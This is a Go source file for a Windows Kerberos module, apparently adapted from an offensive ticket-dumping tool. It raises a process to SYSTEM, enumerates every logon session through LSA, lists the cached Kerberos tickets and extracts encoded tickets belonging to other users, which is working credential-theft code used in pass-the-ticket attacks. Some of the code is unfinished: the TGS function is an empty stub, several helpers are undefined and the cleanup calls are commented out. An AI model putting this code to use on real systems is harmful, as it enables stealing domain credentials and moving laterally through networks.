package kerb

import (
	"fmt"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32 = windows.NewLazyDLL("advapi32.dll")

	procAcquireCredentialsHandleA      = modSecur32.NewProc("AcquireCredentialsHandleA")
	procInitializeSecurityContextA     = modSecur32.NewProc("InitializeSecurityContextA")
	procLsaCallAuthenticationPackage   = modSecur32.NewProc("LsaCallAuthenticationPackage")
	procLsaConnectUntrusted            = modSecur32.NewProc("LsaConnectUntrusted")
	procLsaFreeReturnBuffer            = modSecur32.NewProc("LsaFreeReturnBuffer")
	procLsaEnumerateLogonSessions      = modSecur32.NewProc("LsaEnumerateLogonSessions")
	procLsaGetLogonSessionData         = modSecur32.NewProc("LsaGetLogonSessionData")
	procLsaLookupAuthenticationPackage = modSecur32.NewProc("LsaLookupAuthenticationPackage")
	procImpersonateLoggedOnUser        = advapi32.NewProc("ImpersonateLoggedOnUser")
)

type SEC_WINNT_AUTH_IDENTITY_A struct {
	User           *byte
	UserLength     uint32
	Domain         *byte
	DomainLength   uint32
	Password       *byte
	PasswordLength uint32
	Flags          uint32
}

const (
	SEC_WINNT_AUTH_IDENTITY_ANSI = 1
	KerbQueryTicketCacheMessage  = 1
)

func stringToAnsiPointer(s string) *byte {
	if s == "" {
		return nil
	}
	b := append([]byte(s), 0)
	return &b[0]
}

func TGT(domain, username, password string) ([]byte, error) {
	var credHandle SECURITY_HANDLE
	var timeStamp TimeStamp

	authIdentity := SEC_WINNT_AUTH_IDENTITY_A{
		User:           stringToAnsiPointer(username),
		UserLength:     uint32(len(username)),
		Domain:         stringToAnsiPointer(domain),
		DomainLength:   uint32(len(domain)),
		Password:       stringToAnsiPointer(password),
		PasswordLength: uint32(len(password)),
		Flags:          SEC_WINNT_AUTH_IDENTITY_ANSI,
	}

	packageName := stringToAnsiPointer("Kerberos")

	status, _, errCall := procAcquireCredentialsHandleA.Call(
		0,
		uintptr(unsafe.Pointer(packageName)),
		SECPKG_CRED_OUTBOUND,
		0,
		uintptr(unsafe.Pointer(&authIdentity)),
		0,
		0,
		uintptr(unsafe.Pointer(&credHandle)),
		uintptr(unsafe.Pointer(&timeStamp)),
	)

	if status != SEC_E_OK {
		winErr, _, _ := procGetLastError.Call()
		return nil, fmt.Errorf("AcquireCredentialsHandleA failed: status=0x%x, winErr=0x%x, err=%v", status, winErr, errCall)
	}

	targetName := fmt.Sprintf("krbtgt/%s", strings.ToUpper(domain))
	targetPtr := stringToAnsiPointer(targetName)

	var outBuf SecBuffer
	outBuf.cbBuffer = 2048
	outBuf.BufferType = SECBUFFER_TOKEN
	outBuf.pvBuffer = uintptr(unsafe.Pointer(&make([]byte, outBuf.cbBuffer)[0]))

	var outBufferDesc SecBufferDesc
	outBufferDesc.ulVersion = SECBUFFER_VERSION
	outBufferDesc.cBuffers = 1
	outBufferDesc.pBuffers = uintptr(unsafe.Pointer(&outBuf))

	var contextHandle SECURITY_HANDLE
	var contextAttributes uint32
	contextReqFlags := SECPKG_CRED_OUTBOUND

	status, _, errCall = procInitializeSecurityContextA.Call(
		uintptr(unsafe.Pointer(&credHandle)),
		0,
		uintptr(unsafe.Pointer(targetPtr)),
		uintptr(contextReqFlags),
		0,
		ISC_REQ_DELEGATE|ISC_REQ_MUTUAL_AUTH|ISC_REQ_ALLOCATE_MEMORY, // Kerberos Flags
		// SECURITY_NATIVE_DREP,
		0,
		0,
		uintptr(unsafe.Pointer(&contextHandle)),
		uintptr(unsafe.Pointer(&outBufferDesc)),
		uintptr(unsafe.Pointer(&contextAttributes)),
		uintptr(unsafe.Pointer(&timeStamp)),
	)

	if status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED {
		winErr, _, _ := procGetLastError.Call()
		return nil, fmt.Errorf("InitializeSecurityContextA failed: status=0x%x, winErr=0x%x, err=%v", status, winErr, errCall)
	}

	// defer procDeleteSecurityContext.Call(uintptr(unsafe.Pointer(&contextHandle)))
	// defer procFreeCredentialsHandle.Call(uintptr(unsafe.Pointer(&credHandle)))

	ticketData := unsafe.Slice((*byte)(unsafe.Pointer(outBuf.pvBuffer)), outBuf.cbBuffer)
	ticketCopy := append([]byte(nil), ticketData...)
	return ticketCopy, nil
}

func TGS(tgt []byte, hLsaConnection windows.Handle) (ticket []byte, err error) {
	// Get a TGS using LsaCallAuthenticationPackage

	if err != nil {
		return
	}
	return
}


// lots of code copied from: https://github.com/ziggoon/gkirby.git
func GetLsaHandle() (windows.Handle, error) {
	isHighIntegrity := IsHighIntegrity()
	isSystem := IsSystem()

	// fmt.Printf("obtaining LSA handle\n high integrity: %t\n is system: %t\n", isHighIntegrity, isSystem)

	var lsaHandle windows.Handle
	if isHighIntegrity && !isSystem {
		// fmt.Printf("process is high integrity, but not system\n")
		success := GetSystem()
		if !success {
			return 0, fmt.Errorf("failed to get SYSTEM privileges")
		}
		if !IsSystem() {
			return 0, fmt.Errorf("failed to maintain SYSTEM privileges")
		}

		ret, _, err := procLsaConnectUntrusted.Call(
			uintptr(unsafe.Pointer(&lsaHandle)),
		)
		if ret != 0 {
			return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed: %v", err)
		}

		// revert to original security context after obtain LSA handle as SYSTEM
		_ = windows.RevertToSelf()

		return lsaHandle, nil
	}

	ret, _, err := procLsaConnectUntrusted.Call(
		uintptr(unsafe.Pointer(&lsaHandle)),
	)
	if ret != 0 {
		return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed: %v", err)
	}

	return lsaHandle, nil
}

func GetAuthenticationPackage(lsaHandle windows.Handle, lsaString *LsaString) (uint32, error) {
	var authPackage uint32

	ret, _, err := procLsaLookupAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(unsafe.Pointer(lsaString)),
		uintptr(unsafe.Pointer(&authPackage)),
	)
	if ret != 0 {
		return authPackage, fmt.Errorf("LsaLookupAuthenticationPackage failed: %v", err)
	}

	return authPackage, nil
}

func EnumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]SessionCred, error) {
	var luids []windows.LUID
	var sessionCreds []SessionCred

	isHighIntegrity := IsHighIntegrity()

	if isHighIntegrity {
		var err error
		luids, err = enumerateLogonSessions()
		if err != nil {
			return nil, fmt.Errorf("failed to enumerate logon sessions: %v", err)
		}
		// fmt.Printf("Found %d logon sessions\n", len(luids))
	} else {
		luid, err := getCurrentLUID()
		if err != nil {
			return nil, fmt.Errorf("failed to get current luid: %v", err)
		}
		luids = append(luids, luid)
		// fmt.Printf("Using current session LUID: 0x%x\n", uint64(luid.HighPart)<<32|uint64(luid.LowPart))
	}

	for _, luid := range luids {
		sessionData, err := getLogonSessionData(luid)
		if err != nil {
			fmt.Printf("Warning: failed to get logon session data for LUID 0x%x: %v\n",
				uint64(luid.HighPart)<<32|uint64(luid.LowPart), err)
			continue
		}

		// fmt.Printf("Processing session for user: %s\\%s (LUID: 0x%x)\n",
		// 	sessionData.LogonDomain, sessionData.Username,
		// 	uint64(sessionData.LogonID.HighPart)<<32|uint64(sessionData.LogonID.LowPart))

		var sessionCred SessionCred
		sessionCred.LogonSession = *sessionData
		sessionCred.Tickets = []KrbTicket{}

		// Create and initialize the request structure on the heap
		request := &KerbQueryTktCacheRequest{
			MessageType: KerbQueryTicketCacheMessage,
			LogonId:     sessionData.LogonID,
		}

		// Calculate total size needed
		requestSize := unsafe.Sizeof(*request)

		// Ensure request is properly aligned
		alignedRequest := make([]byte, requestSize)
		*(*KerbQueryTktCacheRequest)(unsafe.Pointer(&alignedRequest[0])) = *request

		var responsePtr uintptr
		var returnLength uint32
		var protocolStatus uint32

		// fmt.Printf("Calling LsaCallAuthenticationPackage for tickets with LUID: 0x%x...\n",
		// 	uint64(request.LogonId.HighPart)<<32|uint64(request.LogonId.LowPart))

		status, _, _ := procLsaCallAuthenticationPackage.Call(
			uintptr(lsaHandle),
			uintptr(authPackage),
			uintptr(unsafe.Pointer(&alignedRequest[0])),
			requestSize,
			uintptr(unsafe.Pointer(&responsePtr)),
			uintptr(unsafe.Pointer(&returnLength)),
			uintptr(unsafe.Pointer(&protocolStatus)),
		)

		// fmt.Printf("LsaCallAuthenticationPackage results:\n")
		// fmt.Printf("  Status: 0x%x\n", status)
		// fmt.Printf("  Protocol Status: 0x%x\n", protocolStatus)
		// fmt.Printf("  Return Length: %d\n", returnLength)
		// fmt.Printf("  Response Pointer: %v\n", responsePtr)

		if status != 0 {
			// fmt.Printf("Warning: LsaCallAuthenticationPackage failed for LUID 0x%x: 0x%x\n",
			// 	uint64(luid.HighPart)<<32|uint64(luid.LowPart), status)
			continue
		}

		if protocolStatus != 0 && protocolStatus != 0xc000005f {
			// fmt.Printf("Warning: Protocol status error for LUID 0x%x: 0x%x\n",
			// 	uint64(luid.HighPart)<<32|uint64(luid.LowPart), protocolStatus)
			continue
		}

		if responsePtr != 0 {
			response := (*KerbQueryTktCacheResponse)(unsafe.Pointer(responsePtr))
			// fmt.Printf("Number of tickets found: %d\n", response.CountOfTickets)

			if response.CountOfTickets > 0 {
				// Calculate the size of a single ticket
				ticketSize := unsafe.Sizeof(KerbTicketCacheInfo{})

				// Get the pointer to the first ticket
				firstTicketPtr := responsePtr + unsafe.Sizeof(*response)

				// Iterate through all tickets
				for i := uint32(0); i < response.CountOfTickets; i++ {
					currentTicketPtr := firstTicketPtr + uintptr(i)*ticketSize
					ticketInfo := (*KerbTicketCacheInfo)(unsafe.Pointer(currentTicketPtr))

					// Safely extract strings by checking if the Buffer pointer is within our response memory
					var serverName, realmName string

					if ticketInfo.ServerName.Buffer != 0 && ticketInfo.ServerName.Length > 0 {
						if ticketInfo.ServerName.Buffer >= responsePtr &&
							ticketInfo.ServerName.Buffer < (responsePtr+uintptr(returnLength)) {
							serverNamePtr := (*[1 << 30]byte)(unsafe.Pointer(ticketInfo.ServerName.Buffer))
							serverName = windows.UTF16ToString((*[1 << 30]uint16)(unsafe.Pointer(&serverNamePtr[0]))[:ticketInfo.ServerName.Length/2])
						}
					}

					if ticketInfo.RealmName.Buffer != 0 && ticketInfo.RealmName.Length > 0 {
						if ticketInfo.RealmName.Buffer >= responsePtr &&
							ticketInfo.RealmName.Buffer < (responsePtr+uintptr(returnLength)) {
							realmNamePtr := (*[1 << 30]byte)(unsafe.Pointer(ticketInfo.RealmName.Buffer))
							realmName = windows.UTF16ToString((*[1 << 30]uint16)(unsafe.Pointer(&realmNamePtr[0]))[:ticketInfo.RealmName.Length/2])
						}
					}

					ticket := KrbTicket{
						StartTime:      FileTimeToTime(ticketInfo.StartTime),
						EndTime:        FileTimeToTime(ticketInfo.EndTime),
						RenewTime:      FileTimeToTime(ticketInfo.RenewTime),
						TicketFlags:    TicketFlags(ticketInfo.TicketFlags),
						EncryptionType: int32(ticketInfo.EncryptionType),
						ServerName:     serverName,
						ServerRealm:    realmName,
					}

					// fmt.Printf("Found ticket for server: %s@%s\n",
					// 	ticket.ServerName, ticket.ServerRealm)

					sessionCred.Tickets = append(sessionCred.Tickets, ticket)
				}
			}

			procLsaFreeReturnBuffer.Call(responsePtr)
		}

		if len(sessionCred.Tickets) > 0 {
			sessionCreds = append(sessionCreds, sessionCred)
		}
	}

	if len(sessionCreds) == 0 {
		return nil, fmt.Errorf("no valid sessions found with tickets")
	}

	return sessionCreds, nil
}

func ExtractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LUID, targetName string) ([]byte, error) {
	if lsaHandle == 0 {
		return nil, fmt.Errorf("invalid LSA handle")
	}

	targetNameUTF16 := windows.StringToUTF16(targetName)
	nameLen := uint16(len(targetNameUTF16) * 2)

	requestSize := unsafe.Sizeof(KerbRetrieveTktRequest{})
	totalSize := requestSize + uintptr(nameLen)

	buffer := make([]byte, totalSize)
	bufferPtr := unsafe.Pointer(&buffer[0])

	request := (*KerbRetrieveTktRequest)(bufferPtr)
	request.MessageType = KerbRetrieveEncodedTicketMessage

	// set LUID based on current token context
	if IsHighIntegrity() {
		// value := uint64(luid.HighPart)<<32 | uint64(luid.LowPart)
		// fmt.Printf("setting luid: 0x%x\n", value)
		request.LogonId = luid
	} else {
		request.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
	}

	request.TicketFlags = 0
	request.CacheOptions = 8
	request.EncryptionType = 0
	request.CredentialsHandle = SecurityHandle{}

	targetNamePtr := uintptr(bufferPtr) + requestSize

	stringData := unsafe.Slice((*byte)(unsafe.Pointer(&targetNameUTF16[0])), nameLen)
	targetSlice := unsafe.Slice((*byte)(unsafe.Pointer(targetNamePtr)), nameLen)
	copy(targetSlice, stringData)

	request.TargetName = LsaString{
		Length:        nameLen - 2,
		MaximumLength: nameLen,
		Buffer:        targetNamePtr,
	}

	// fmt.Printf("ticket request struct: \n%+v\n", request)

	var responsePtr uintptr
	var returnLength uint32
	var protocolStatus uint32

	ret, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(authPackage),
		uintptr(bufferPtr),
		totalSize,
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&returnLength)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	// fmt.Printf("\nLsaCallAuthenticationPackage results:\n")
	// fmt.Printf("  Return code: 0x%x\n", ret)
	// fmt.Printf("  Protocol status: 0x%x\n", protocolStatus)
	// fmt.Printf("  Return length: %d\n", returnLength)
	// fmt.Printf("  Response pointer: %v\n", responsePtr)

	if ret != 0 {
		return nil, fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
	}

	if protocolStatus != 0 {
		return nil, fmt.Errorf("protocol status error: 0x%x", protocolStatus)
	}

	if responsePtr != 0 {
		// defer procLsaFreeReturnBuffer.Call(responsePtr)
		response := (*KerbRetrieveTktResponse)(unsafe.Pointer(responsePtr))
		encodedTicketSize := response.Ticket.EncodedTicketSize

		if encodedTicketSize > 0 {
			encodedTicket := make([]byte, encodedTicketSize)
			copy(encodedTicket,
				(*[1 << 30]byte)(unsafe.Pointer(response.Ticket.EncodedTicket))[:encodedTicketSize])

			return encodedTicket, nil
		}
	} else {
	}

	return nil, fmt.Errorf("KRB_RETRIEVE_TKT_RESPONSE failed")
}

func enumerateLogonSessions() ([]windows.LUID, error) {
	var count uint32
	var luids uintptr

	ret, _, _ := procLsaEnumerateLogonSessions.Call(
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&luids)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaEnumerateLogonSessions failed with error: 0x%x", ret)
	}

	luidSlice := make([]windows.LUID, count)
	for i := uint32(0); i < count; i++ {
		luid := (*windows.LUID)(unsafe.Pointer(luids + uintptr(i)*unsafe.Sizeof(windows.LUID{})))
		luidSlice[i] = *luid
	}

	// defer procLsaFreeReturnBuffer.Call(luids)
	return luidSlice, nil
}

func getCurrentLUID() (windows.LUID, error) {
	var currentToken windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &currentToken)
	if err != nil {
		return windows.LUID{}, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	// defer currentToken.Close()

	var tokenStats TokenStatistics
	var returnLength uint32

	err = windows.GetTokenInformation(currentToken, windows.TokenStatistics, (*byte)(unsafe.Pointer(&tokenStats)), uint32(unsafe.Sizeof(tokenStats)), &returnLength)
	if err != nil {
		return windows.LUID{}, fmt.Errorf("GetTokenInformation failed: %v", err)
	}

	return tokenStats.AuthenticationId, nil
}

func getLogonSessionData(luid windows.LUID) (*LogonSessionData, error) {
	var sessionDataPtr uintptr

	ret, _, _ := procLsaGetLogonSessionData.Call(
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&sessionDataPtr)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaGetLogonSessionData failed with error: 0x%x", ret)
	}

	// defer procLsaFreeReturnBuffer.Call(sessionDataPtr)

	sessionData := (*SecurityLogonSessionData)(unsafe.Pointer(sessionDataPtr))

	result := &LogonSessionData{
		LogonID:               sessionData.LoginID,
		Username:              LsaStrToString(sessionData.Username),
		LogonDomain:           LsaStrToString(sessionData.LoginDomain),
		AuthenticationPackage: LsaStrToString(sessionData.AuthenticationPackage),
		LogonType:             LogonType(sessionData.LogonType),
		Session:               int32(sessionData.Session),
		LogonTime:             time.Unix(0, int64(sessionData.LoginTime)*100),
		LogonServer:           LsaStrToString(sessionData.LogonServer),
		DnsDomainName:         LsaStrToString(sessionData.DnsDomainName),
		Upn:                   LsaStrToString(sessionData.Upn),
	}

	if sessionData.PSiD != 0 {
		var sidStr *uint16
		err := windows.ConvertSidToStringSid((*windows.SID)(unsafe.Pointer(sessionData.PSiD)), &sidStr)
		if err == nil {
			result.Sid, _ = windows.StringToSid(windows.UTF16PtrToString(sidStr))
			windows.LocalFree(windows.Handle(unsafe.Pointer(sidStr)))
		}
	}

	return result, nil
}

type KerbQueryTktCacheRequest struct {
	MessageType uint32
	LogonId     windows.LUID
	// No additional fields for basic query
}

type KerbQueryTktCacheResponse struct {
	MessageType    uint32
	CountOfTickets uint32
	Tickets        [1]KerbTicketCacheInfo // Variable length array
}

type KerbTicketCacheInfo struct {
	ServerName     LsaString
	RealmName      LsaString
	StartTime      int64
	EndTime        int64
	RenewTime      int64
	EncryptionType int32
	TicketFlags    uint32
}
